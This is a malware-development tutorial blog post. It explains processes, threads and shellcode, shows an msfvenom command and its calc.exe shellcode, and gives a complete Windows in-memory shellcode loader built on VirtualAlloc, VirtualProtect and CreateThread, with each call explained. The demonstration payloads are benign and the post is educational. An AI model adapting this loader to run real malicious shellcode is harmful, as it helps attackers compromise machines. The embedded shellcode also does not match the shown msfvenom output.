---
title: "Malware Development 2"
date: 2026-01-24 00:00:00 +0000
categories: [Maldev]
tags: [Maldev]
---

Intro to Malware Development 2
In my previous blog i talked about what a malware is and why people might develop a malware along with the prerequisites for malware development. so in this blog ill walk you through what shellcode is and how we can program our first malware. but before that let me explain to you what Thread and Processes are.

## Threads and Processes

So what is a Process, Think of a process as a program in action, lets say when you execute chrome. Windows will create a chrome process. it has its own memory space, code, data and resources. Processes are isolated from each other, one process usually cannot directly access another process's memory. You can have multiple processes running at the same time, each independent.

With Processes out of the way let me walk you through Threads, a thread is a single sequence of instructions that the CPU executes inside a process, a process can have one thread (single-threaded) or many threads (multi-threaded). all these threads in a process share the same memory7 and resources of the process. Each thread has its own stack (where it keeps local variables and execution info) and instruction pointer (where it is currently executing).

## What on earth is Shellcode
So according to googles AI:

> Shellcode is a compact, machine-code payload used in software vulnerability exploits to execute arbitrary commands, often spawning a command shell (`/bin/sh` or `cmd.exe`). Written in assembly, it is injected into a target process's memory to gain unauthorized control or escalate privileges. Shellcode directly manipulates processor registers and system calls.

But, in simple terms I'd say Shellcode is a set of instructions that attackers used by an attacker to inject into a program to execute arbitrary commands.

Shellcode in general is built through assembly, and assembly is an language that is also called machine language that is a low level programming language which will allow us to communicate with a computer's Hardware and CPU registers.

## How can we make Shellcode
There are a couple of ways you can actually make Shellcode:
1. Make your own shellcode from scratch with Assembly
2. Make Shellcode via MSFVenom
3. Make Shellcode via C2 Frameworks

For the purpose of this blog ill be using msfvenom to keep things less complicated. So for this example ill use the shellcode to launch Calculator.

```bash
msfvenom -p windows/x64/exec CMD="calc.exe" -f c
```

So this is command to generate shellcode to execute calculator, what I've done here is made shellcode to execute calculator.exe in Windows x64 and I've taken the output in the C format so it won't be raw bytes.

The Output:
```
unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

```
## How can we execute Shellcode
To execute shellcode you have to use a shellcode loader, so let me explain the flow and logic behind a shell code loader. so you can better understand how a malware works.

This is how generally the flow of shellcode execution works:

> Execution of the shellcode loader, creates a process -> To execute the Shellcode we need to create a new memory space in the current process for the size of the shellcode -> Then we need to copy the shellcode we have generated to that memory space which we created previously -> and then we need to change the memory pace permission to read and execute (RX)  -> then we need to crate the a thread about the memory space we created to execute and run the shellcode

Each of these stages co relate with a WinAPI function. 
1. Create Memory Space -> VirtualAlloc
2. Copy Shellcode to Memory Space -> RtlMoveMemory
3. Change memory space permissions -> VirtualProtect
4. Create Thread -> CreateThread

Here's the Shellcode Loader Template I'll explain this under the code snippet:

```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char shellcode[] = 
"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52"
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"
"\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01"
"\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x01"
"\xd3\x50\x8b\x48\x18\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31"
"\xff\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75"
"\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01"
"\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01"
"\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58"
"\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\xe8\x0b\x00\x00"
"\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x68\x4c"
"\x77\x26\x07\xff\xd5\x6a\x00\xe8\x0b\x00\x00\x00\x4d\x65"
"\x73\x73\x61\x67\x65\x42\x6f\x78\x00\xe8\x08\x00\x00\x00"
"\x4d\x65\x73\x73\x61\x67\x65\x00\x6a\x00\x68\x45\x83\x56"
"\x07\xff\xd5\x6a\x00\x68\xf0\xb5\xa2\x56\xff\xd5";


unsigned int payloadLen = sizeof(shellcode);

int main(void){
    void * memoryBuffer;
    BOOL rv;
    HANDLE th;
    DWORD oldProtect = 0;

    memoryBuffer = VirtualAlloc(0, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    RtlMoveMemory(memoryBuffer, shellcode, payloadLen);
    rv = VirtualProtect(memoryBuffer, payloadLen, PAGE_EXECUTE_READ, &oldProtect);


    if (rv != 0) {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) memoryBuffer, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
    return 0;
}

```

## Breakdown of the Shellcode Loader

### Creating Memory Space

```
memoryBuffer = VirtualAlloc(
    0,
    payloadLen,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
);
```

- What this code snippet does is this requests windows to allocate memory inside the current process. let me walk you through the parameters for a better explanation, 
- VirtualAlloc -> Allocate Memory for Shellcode

Here's the VirtualAlloc Template Breakdown

```
LPVOID VirtualAlloc(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);
```

- lpAddress -> 0
	- This specifies the starting address of the memory allocation.
	- So "0" in the snippet i gave means:
		- You are not choosing a specific address
		- Windows will automatically select a suitable memory location 
	- This is the safest and most commonly used method.
- dwSize -> payloadLen
	- This specifies the size of memory to allocate, in bytes.
	- payloadLen
		- This matches the exact size of the payload
		- While ensuring the program has enough space to store the entire payload in memory
- flAllocationType -> MEM_COMMIT , MEM_RESERVE
	- This controls how the memory is allocated on the process
		- MEM_RESERVE
			- Reserves a range of virtual address space.
			- No physical memory is assigned yet at this current point.
		- MEM_COMMIT
			- Allocates physical memory for that address space.
- flProtect -> PAGE_READWRITE
	- This sets the initial memory protection
	- PAGE_READWRITE
		- Memory can be read from 
		- Memory can be written to 
		- Memory cannot be executed
	- Required so the payload bytes can be copied safely.
### Copying the payload into memory

```
RtlMoveMemory(
    memoryBuffer,
    payload,
    payloadLen
);
```

- This code snippet copies the payload bytes into the allocated memory region by performing a direct byte-for-byte memory copy, this places the payload at the exact location that will later be executed. let me walk you through the parameters for a better explanation,
- RtlMoveMemory -> Copies the payload into memory 

Here's the RtlMoveMemory Template Breakdown

```
VOID RtlMoveMemory(
    VOID UNALIGNED *Destination,
    CONST VOID UNALIGNED *Source,
    SIZE_T Length
);
```

- Destination -> memoryBuffer
	- Pointer to the destination memory address.
	- This is the buffer returned by VirtualAlloc.
	- The payload bytes will be now copied into this memory region.
- Source -> payload
	- Pointer to source buffer.
	- Contains the raw payload bytes.
	- Data is copied from this buffer.
- Length -> payloadLen
	- This defines the number of bytes to copy.
	- This also ensures the entire payload is transffered.
	- This also prevents partial or overflow copies.

### Changing memory permissions

```
VirtualProtect(memoryBuffer, payloadLen, PAGE_EXECUTE_READ, &oldProtect);
```

- This code snippet modifies the memory protection of the allocated region and changes the permission from the read/write to read/execute while allowing the CPU to execute instructions from the memory and removes write access to comply with DEP (Data Execution Prevention) and stores the previous protection value in oldProtect. let me walk you through the parameters for a better explanation,
- VirtualProtect -> Changes memory permissions

Here's the VirtualProtect Template Breakdown

```
BOOL VirtualProtect(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
);
```

- lpAddress -> memoryBuffer
	- This defines the starting address of the memory region.
	- Also this is the same memory where the payload was copied.
- dwSize -> payloadLen
	- This defines the size of the memory region whose protection is being changed.
	- This also ensures only the payload memory is affected.
- flNewProtect -> PAGE_EXECUTE_READ
	- This sets the new memory permissions.
		- Allows:
			- Read Access
			- Execution of instructions
		- Removes write access
		- This is required for the CPU to execute the payload.
- lpflOldProtect -> &oldProtect
	- This is a pointer to a variable that stores the previous memory protection.
	- This is useful if the permissions need to be restored later.

### Executing the payload

```
CreateThread(
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)memoryBuffer,
    NULL,
    0,
    NULL
);
```

- This creates a new thread in the current process, also sets the thread entry point to the payload's memory address which causes execution to begin directly from the payload in memory, and the payload runs with the same privileges as the current process.  let me walk you through the parameters for a better explanation,
- CreateThread -> Executes the Payload

Here's the CreateThread Template Breakdown

```
HANDLE CreateThread(
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);
```

- lpThreadAttributes -> NULL
	- Uses default security settings for the thread.
	- No custom access control is applied here
- dwStackSize -> 0
	- This uses default stack size for the new thread and windows is allowed to decide the appropriate size.
- lpStartAddress -> memoryBuffer
	- This is the entry point for the thread this points directly to the memory containing the payload, this is where the execution begins at this address
- lpParameter -> NULL
	- Here there are no parameters passed to the thread
	- The Payload is expected to be position-independent.
- dwCreationFlags -> 0
	- The thread starts executing immediately after creation. there will be no suspended state.
- lpThreadId -> NULL
	- The thread ID is not needed therefore the value is ignored.

So this is how a malware is created and this is how a malware works internally, this part only covers the basics of malware development we'll talk more about AV bypass and and related topics in future blogs so stay tuned. hope you learned something new alongside me. so Kudos to that see you in another blog.